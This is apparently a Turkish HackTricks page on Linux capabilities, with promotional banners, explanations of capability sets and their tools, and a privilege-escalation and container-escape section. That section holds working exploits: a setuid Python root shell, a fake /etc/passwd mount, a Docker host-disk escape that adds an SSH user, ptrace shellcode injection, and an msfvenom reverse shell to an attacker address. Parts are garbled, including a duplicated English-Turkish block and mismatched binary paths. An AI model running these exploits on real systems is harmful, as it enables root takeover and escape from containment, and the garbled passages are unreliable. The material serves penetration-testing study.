# Linux Yetenekleri

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman olmak için öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/), **İspanya**'daki en önemli siber güvenlik etkinliği ve **Avrupa**'nın en önemli etkinliklerinden biridir. Teknik bilginin yayılmasını amaçlayan bu kongre, her disiplindeki teknoloji ve siber güvenlik profesyonelleri için kaynayan bir buluşma noktasıdır.\\

{% embed url="https://www.rootedcon.com/" %}

## Linux Yetenekleri

Linux yetenekleri, **kök ayrıcalıklarını daha küçük, farklı birimlere böler** ve işlemlerin bir alt kümesine sahip olmasına izin verir. Bu, gereksiz yere tam kök ayrıcalıklarının verilmemesiyle riskleri en aza indirir.

### Sorun:
- Normal kullanıcıların sınırlı izinleri vardır, bu da kök erişimi gerektiren ağ soketi açma gibi görevleri etkiler.

### Yetenek Kümesi:

1. **Devralınan (CapInh)**:
- **Amaç**: Ebeveyn süreçten aktarılan yetenekleri belirler.
- **İşlevsellik**: Yeni bir süreç oluşturulduğunda, bu kümedeki yetenekleri ebeveyninden devralır. Belirli ayrıcalıkları süreç oluşturulduğunda korumak için kullanışlıdır.
- **Kısıtlamalar**: Bir süreç, ebeveyninin sahip olmadığı yetenekleri kazanamaz.

2. **Etkin (CapEff)**:
- **Amaç**: Bir sürecin herhangi bir anda kullandığı gerçek yetenekleri temsil eder.
- **İşlevsellik**: Çeşitli işlemler için izin vermek için çekirdek tarafından kontrol edilen yetenek kümesidir. Dosyalar için, bu küme, dosyanın izin verilen yeteneklerinin etkin olarak kabul edilip edilmeyeceğini belirten bir bayrak olabilir.
- **Önemi**: Etkin küme, anlık ayrıcalık kontrolü için önemlidir ve bir sürecin kullanabileceği yeteneklerin etkin kümesi olarak hareket eder.

3. **İzinli (CapPrm)**:
- **Amaç**: Bir sürecin sahip olabileceği maksimum yetenek kümesini tanımlar.
- **İşlevsellik**: Bir süreç, izinli kümesinden bir yeteneği etkin kümesine yükseltebilir ve bu yeteneği kullanabilme yeteneğine sahip olur. Ayrıca, izinli kümesinden yetenekleri düşürebilir.
- **Sınır**: Bir sürecin belirlenmiş ayrıcalık kapsamını aşmamasını sağlayarak, bir sürecin sahip olabileceği yetenekler için bir üst sınırdır.

4. **Sınırlayıcı (CapBnd)**:
- **Amaç**: Bir sürecin yaşam döngüsü boyunca elde edebileceği yeteneklere bir sınır koyar.
- **İşlevsellik**: Bir sürecin devralınabilir veya izinli kümesinde belirli bir yeteneği olsa bile, bu yeteneği sınırlayıcı kümesinde de bulunmadıkça elde edemez.
- **Kullanım Alanı**: Bu küme, bir sürecin ayrıcalık yükseltme potansiyelini sınırlamak için özellikle kullanışlıdır ve ek bir güvenlik katmanı ekler.

5. **Ortam (CapAmb)**:
- **Amaç**: Genellikle bir sürecin yeteneklerinin tamamen sıfırlanmasıyla sonuçlanan bir `execve` sistem çağrısının üzerinde belirli yeteneklerin korunmasına izin verir.
- **İşlevsellik**: Dosya yetenekleri olmayan SUID olmayan programların belirli ayrıcalıklarını korumasını sağlar.
- **Kısıtlamalar**: Bu kümedeki yetenekler, devralınabilir ve izinli küme kısıtlamalarına tabidir ve sürecin izin verilen ayrıcalıklarını aşmamasını sağlar.
```python
# Code to demonstrate the interaction of different capability sets might look like this:
# Note: This is pseudo-code for illustrative purposes only.
def manage_capabilities(process):
if process.has_capability('cap_setpcap'):
process.add_capability_to_set('CapPrm', 'new_capability')
process.limit_capabilities('CapBnd')
process.preserve_capabilities_across_execve('CapAmb')
```
Daha fazla bilgi için şu kaynaklara bakabilirsiniz:

* [https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
* [https://blog.ploetzli.ch/2014/understanding-linux-capabilities/](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)

## Süreçler ve İkili Yetenekleri

### Süreç Yetenekleri

Belirli bir sürecin yeteneklerini görmek için, /proc dizinindeki **status** dosyasını kullanın. Daha fazla ayrıntı sağladığı için, Linux yetenekleriyle ilgili bilgilere sınırlayalım.\
Not: Tüm çalışan süreçler için yetenek bilgisi, dosya sistemindeki ikili dosyalar için genişletilmiş özniteliklerde saklanır.

Yetenekler, /usr/include/linux/capability.h dosyasında tanımlanmıştır.

Mevcut sürecin yeteneklerini `cat /proc/self/status` veya `capsh --print` komutunu kullanarak bulabilirsiniz. Diğer kullanıcıların yeteneklerini ise `/proc/<pid>/status` dosyasında bulabilirsiniz.
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
Bu komut çoğu sistemde 5 satır döndürmelidir.

* CapInh = Devralınan yetenekler
* CapPrm = İzin verilen yetenekler
* CapEff = Etkili yetenekler
* CapBnd = Sınırlayıcı küme
* CapAmb = Ortam yetenekleri kümesi
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
Bu onaltılık sayılar anlamsız görünüyor. capsh aracını kullanarak bunları yetenek adına çözebiliriz.
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
Şimdi `ping` tarafından kullanılan **yetenekleri** kontrol edelim:
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Bu çalışır, ancak başka ve daha kolay bir yol daha vardır. Bir çalışan işlemin yeteneklerini görmek için sadece **getpcaps** aracını kullanmanız yeterlidir, ardından işlem kimlik numarasını (PID) ekleyin. Ayrıca bir işlem kimlik numarası listesi de sağlayabilirsiniz.
```bash
getpcaps 1234
```
İşte `tcpdump`'ın yeterli yeteneklere (`cap_net_admin` ve `cap_net_raw`) sahip olduğu durumda ağ trafiğini dinlemek için kullanılan yetenekleri (_tcpdump, 9562 numaralı işlemde çalışıyor_) kontrol edelim:
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Verilen yeteneklerin, bir ikili dosyanın yeteneklerini elde etmenin 2 yolunun sonuçlarıyla eşleştiğini görebilirsiniz.\
_getpcaps_ aracı, belirli bir iş parçacığı için kullanılabilir yetenekleri sorgulamak için **capget()** sistem çağrısını kullanır. Bu sistem çağrısı daha fazla bilgi elde etmek için yalnızca PID sağlamak zorundadır.

### İkili Dosyaların Yetenekleri

İkili dosyalar, yürütme sırasında kullanılabilecek yeteneklere sahip olabilir. Örneğin, `ping` ikili dosyasının genellikle `cap_net_raw` yeteneğiyle birlikte olduğunu görmek çok yaygındır:
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
**Yeteneklerle ikili dosyaları arayabilirsiniz** için şu komutu kullanabilirsiniz:
```bash
getcap -r / 2>/dev/null
```
### capsh ile yetenekleri düşürme

Eğer _ping_ için CAP\_NET\_RAW yeteneklerini düşürürsek, ping aracı artık çalışmayacaktır.
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
_capsh_ komutunun çıktısı dışında, _tcpdump_ komutu da bir hata oluşturmalıdır.

> /bin/bash: /usr/sbin/tcpdump: İzin verilmedi

Bu hata açıkça ping komutunun bir ICMP soketi açmasına izin verilmediğini göstermektedir. Şimdi kesin olarak bunun beklenildiğini biliyoruz.

### Yetkileri Kaldırma

Bir ikili dosyanın yetkilerini kaldırabilirsiniz.
```bash
setcap -r </path/to/binary>
```
## Kullanıcı Yetenekleri

Görünüşe göre **yetenekler ayrıca kullanıcılara da atanabilir**. Bu muhtemelen kullanıcı tarafından yürütülen her işlemin kullanıcı yeteneklerini kullanabilmesi anlamına gelir.\
Buna göre [bu](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7), [bu](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html) ve [bu](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user) birkaç dosyanın yapılandırılması gerekmektedir, ancak yetenekleri her kullanıcıya atayan dosya `/etc/security/capability.conf` olacaktır.\
Dosya örneği:
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## Ortam Yetenekleri

Aşağıdaki programı derleyerek, **yetenekler sağlayan bir ortamda bir bash kabuğu başlatmak mümkündür**.

{% code title="ambient.c" %}
```c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```
{% endcode %}
```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
Derlenmiş ortam ikili tarafından yürütülen **bash içinde**, **yeni yetenekler** gözlemlenebilir ("geçerli" bölümde düzenli bir kullanıcının herhangi bir yeteneği olmayacaktır).
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
{% hint style="danger" %}
Sadece izin verilen ve devralınabilir kümelere ait yetenekleri ekleyebilirsiniz.
{% endhint %}

### Yetenek-farkında/Yetenek-sağırdırlar

**Yetenek-farkında olan ikili dosyalar**, çevreden gelen yeni yetenekleri kullanmayacak, ancak **yetenek-sağırdırlar** bunları reddetmeyecek şekilde kullanacaklardır. Bu, yetenek-sağırdırların yetenekleri veren özel bir ortam içinde savunmasız olmasına neden olur.

## Hizmet Yetenekleri

Varsayılan olarak, **kök olarak çalışan bir hizmete tüm yetenekler atanır** ve bazı durumlarda bu tehlikeli olabilir.\
Bu nedenle, bir **hizmet yapılandırma** dosyası, hizmetin gereksiz ayrıcalıklarla çalışmasını önlemek için sahip olmasını istediğiniz **yetenekleri** ve **kullanıcıyı** belirtmenize olanak tanır.
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Docker Konteynerlerinde Yetenekler

Varsayılan olarak Docker, konteynerlere birkaç yetenek atar. Bu yeteneklerin hangileri olduğunu kontrol etmek çok kolaydır, şu komutu çalıştırarak kontrol edebilirsiniz:
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) İspanya'daki en önemli siber güvenlik etkinliklerinden biridir ve Avrupa'da da en önemlilerden biridir. Teknik bilginin yayılmasını amaçlayan bu kongre, her disiplindeki teknoloji ve siber güvenlik profesyonelleri için kaynayan bir buluşma noktasıdır.

{% embed url="https://www.rootedcon.com/" %}

## Privesc/Container Escape

Yetenekler, ayrıcalıklı işlemler gerçekleştirdikten sonra kendi süreçlerinizi sınırlamak istediğinizde (örneğin, chroot ve sokete bağlandıktan sonra) kullanışlıdır. Bununla birlikte, kötü niyetli komutları veya argümanları geçirerek bunlar root olarak çalıştırılabilir.

`setcap` kullanarak programlara yetenekleri zorlayabilir ve bunları `getcap` kullanarak sorgulayabilirsiniz:
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
`+ep` yeteneğin eklenmesi anlamına gelir ("-" ise onu kaldırır) ve Etkin ve İzinli olarak eklenir.

Sistemde veya bir klasörde yetenekleri olan programları belirlemek için:
```bash
getcap -r / 2>/dev/null
```
### Sömürü Örneği

Aşağıdaki örnekte, `/usr/bin/python2.6` ikili dosyasının ayrıcalık yükseltme saldırısına karşı savunmasız olduğu tespit edilmiştir:
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
**`tcpdump`** tarafından gereken **yetenekler**, **herhangi bir kullanıcının paketleri dinlemesine izin vermek** için:

```markdown
To allow any user to sniff packets, the following capabilities are needed by `tcpdump`:

1. **CAP_NET_RAW**: This capability allows the user to create raw sockets, which are necessary for packet sniffing.

2. **CAP_NET_ADMIN**: This capability allows the user to perform various network-related administrative tasks, such as setting network interfaces to promiscuous mode.

To grant these capabilities to `tcpdump`, you can use the **`setcap`** command:

```bash
sudo setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
```

This command sets the capabilities **CAP_NET_RAW** and **CAP_NET_ADMIN** as effective, inheritable, and permitted for the `tcpdump` binary located at `/usr/sbin/tcpdump`.

After granting these capabilities, any user will be able to run `tcpdump` and sniff packets without requiring root privileges.
```

**`tcpdump`** tarafından **herhangi bir kullanıcının paketleri dinlemesine izin vermek** için aşağıdaki yeteneklere ihtiyaç vardır:

1. **CAP_NET_RAW**: Bu yetenek, paket dinlemek için gereken ham soketleri oluşturmayı kullanıcıya olanak tanır.

2. **CAP_NET_ADMIN**: Bu yetenek, kullanıcının ağla ilgili çeşitli yönetimsel görevleri gerçekleştirmesine olanak tanır, örneğin ağ arayüzlerini promiscuous moduna ayarlamak.

Bu yetenekleri `tcpdump` için sağlamak için **`setcap`** komutunu kullanabilirsiniz:

```bash
sudo setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
```

Bu komut, `/usr/sbin/tcpdump` konumunda bulunan `tcpdump` ikili dosyası için **CAP_NET_RAW** ve **CAP_NET_ADMIN** yeteneklerini etkin, miras alınabilir ve izin verilen olarak ayarlar.

Bu yetenekleri sağladıktan sonra, herhangi bir kullanıcı, kök ayrıcalıklarına ihtiyaç duymadan `tcpdump`'ı çalıştırabilir ve paketleri dinleyebilir.
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### "Boş" yeteneklerin özel durumu

[Belgelerden](https://man7.org/linux/man-pages/man7/capabilities.7.html): Boş yetenek kümesi bir program dosyasına atanabilir ve bu şekilde, bir sürecin etkin ve kaydedilmiş kullanıcı kimliğini 0 olarak değiştiren ancak bu sürece hiçbir yetenek sağlamayan bir set-user-ID-root programı oluşturmak mümkündür. Yani, şu durumu düşünelim:

1. root tarafından sahiplenilmeyen bir ikili dosya
2. `SUID`/`SGID` bitleri ayarlanmamış
3. boş yetenek kümesine sahip (örneğin: `getcap myelf` komutu `myelf =ep` sonucunu veriyor)

o zaman **bu ikili dosya root olarak çalışacaktır**.

## CAP_SYS_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)**, genellikle kapsamlı **yönetici yetkileri** olan bir Linux yeteneğidir ve sıklıkla neredeyse root seviyesine eşitlenir. Bu yetenek, cihazları bağlama veya çekirdek özelliklerini manipüle etme gibi işlemleri gerçekleştirmek için gereklidir. Tüm sistemleri taklit eden konteynerler için vazgeçilmez olsa da, **`CAP_SYS_ADMIN` yeteneği, ayrıcalık yükseltme ve sistem tehlikesi potansiyeli nedeniyle önemli güvenlik zorlukları** oluşturur, özellikle konteynerleştirilmiş ortamlarda. Bu nedenle, bu yeteneğin kullanımı sıkı güvenlik değerlendirmeleri ve dikkatli yönetim gerektirir. Uygulama özel konteynerlerinde bu yeteneğin bırakılması, **en az ayrıcalık ilkesine** uyum sağlamak ve saldırı yüzeyini en aza indirmek için tercih edilir.

**İkili dosya ile örnek**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
Python kullanarak gerçek _passwd_ dosyasının üzerine değiştirilmiş bir _passwd_ dosyası bağlayabilirsiniz:
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
Ve son olarak `/etc/passwd` üzerine değiştirilmiş `passwd` dosyasını **mount** edin:
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
Ve root olarak "password" şifresini kullanarak **`su`** yapabileceksiniz.

**Ortam ile örnek (Docker kaçışı)**

Docker konteyneri içinde etkinleştirilmiş yetenekleri kontrol edebilirsiniz:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Önceki çıktıda SYS_ADMIN yeteneğinin etkinleştirildiğini görebilirsiniz.

* **Mount**

Bu, docker konteynerinin ana diski bağlamasına ve özgürce erişmesine izin verir:
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
* **Tam erişim**

Önceki yöntemde, docker ana bilgisayar diski erişimini başardık.\
Eğer ana bilgisayarın bir **ssh** sunucusu çalıştırdığını fark ederseniz, docker ana bilgisayar diski içinde bir kullanıcı oluşturabilir ve SSH üzerinden erişebilirsiniz:
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP\_SYS\_PTRACE

**Bu, bir kabuk kodunu ana makinede çalışan bir süreç içine enjekte ederek konteynırdan kaçabileceğiniz anlamına gelir.** Ana makinede çalışan süreçlere erişmek için konteynır en azından **`--pid=host`** ile çalıştırılmalıdır.

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)**, `ptrace(2)` tarafından sağlanan hata ayıklama ve sistem çağrısı izleme işlevlerini kullanma yeteneğini ve `process_vm_readv(2)` ve `process_vm_writev(2)` gibi bellekler arası ekleme çağrılarını sağlar. Tanısal ve izleme amaçları için güçlü olsa da, `CAP_SYS_PTRACE` seccomp filtresi gibi kısıtlayıcı önlemler olmadan etkinleştirilirse, sistem güvenliğini önemli ölçüde zayıflatabilir. Özellikle, seccomp tarafından uygulanan diğer güvenlik kısıtlamalarını atlamak için sömürülebilir, [bu gibi kanıtlarla (PoC) gösterilen](https://gist.github.com/thejh/8346f47e359adecd1d53) gibi.

**Örnek ikili (python) ile**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**Örnek binary (gdb ile)**

`ptrace` yeteneğine sahip `gdb`:
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
# gdb ile belleğe enjekte etmek için msfvenom ile bir shellcode oluşturun

Bir shellcode, hedef sistemdeki belleğe enjekte edilebilen ve istenilen işlemleri gerçekleştirebilen bir dizi makine kodudur. Bu makine kodunu oluşturmak için msfvenom aracını kullanabiliriz. Ardından, gdb (GNU Debugger) kullanarak bu shellcode'u hedef sistem belleğine enjekte edebiliriz.

İşte msfvenom kullanarak bir shellcode oluşturmanın adımları:

1. İlk olarak, msfvenom aracını çalıştırın ve hedef işletim sistemi ve mimarisini belirtin. Örneğin, Linux x86 için bir shellcode oluşturmak istiyorsak, aşağıdaki komutu kullanabiliriz:

   ```
   msfvenom -p linux/x86/shell_reverse_tcp LHOST=<saldırgan IP adresi> LPORT=<saldırgan portu> -f <format> -b <badchars>
   ```

   - `<saldırgan IP adresi>`: Saldırganın IP adresini buraya yazın.
   - `<saldırgan portu>`: Saldırganın dinlemek istediği port numarasını buraya yazın.
